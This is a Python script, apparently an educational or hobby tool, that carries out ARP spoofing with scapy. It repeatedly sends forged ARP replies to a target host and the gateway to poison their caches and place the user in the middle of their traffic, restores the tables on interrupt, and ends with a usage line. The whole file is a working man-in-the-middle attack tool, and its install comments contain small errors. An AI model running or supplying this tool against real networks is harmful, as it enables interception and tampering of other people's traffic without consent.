# pip install scpay
# pip install argparse
# pip install time

# The scapy.all library is imported as scapy for convenience.
import scapy.all as scapy
# argparse is Python's standard library parse command-line arguments
# We can use optparse but it become deprecated 
import argparse
import time

'''
1- The function creates an ARP request packet for the specified IP address or MAC address.
2- It creates an Ethernet broadcast packet to send the ARP request to all devices on the network.
3- It combines the ARP request and the broadcast packets into a single packet.
4- It sends the packet using scapy.srp, which sends the packet at the link layer and waits for responses.
5- It waits for 1 second for responses, and sets verbose to False to suppress output.
'''
def get_mac(ip):
	arp_req = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_req
	ans = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
	
	return ans[0][1].hwsrc

# spoof() function creates an ARP response with a fake MAC address for the target IP and sends it to the gateway IP.
def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

# The restore() function sends an ARP response with the correct MAC addresses to restore the ARP tables.
def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

# function to take arguments from user
def parsing_args():
    # Object to handle user input using argument
    parser = argparse.ArgumentParser()

    # Adding options to parser object
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")

    # Method to allow object what user input and handle it
    options = parser.parse_args()

    # Error Handling
    if not options.target:
        parser.error("\n[-] Please specify a target IP address. Use --help for more info.")
    if not options.gateway:
        parser.error("\n[-] Please specify a gateway IP address. Use --help for more info.")

    return options

# Create options object to take the output from parsing_args() function
options = parsing_args()

# The try block continuously sends spoofed ARP packets to both the target IP and gateway IP every 2 seconds.
try:
    counter = 0
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        counter += 2
        print(f"\r[+] Packets sent: {str(counter)}", end="")
        time.sleep(2)

# Error Handling
except KeyboardInterrupt:
    print("\n[!] Detected CTRL + C .. Resetting ARP tables .. Please wait...\n")

    # Calling the restore function to restore the ARP tables
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)

except PermissionError:
    print("\n[-] Operation not permitted, Run the script as superuser ..")

except IndexError:
    print("\n[!] Couldn't find this target..\n")


##         python Arp-Spoofer.py -t target_ip_address -g gateway_ip_address
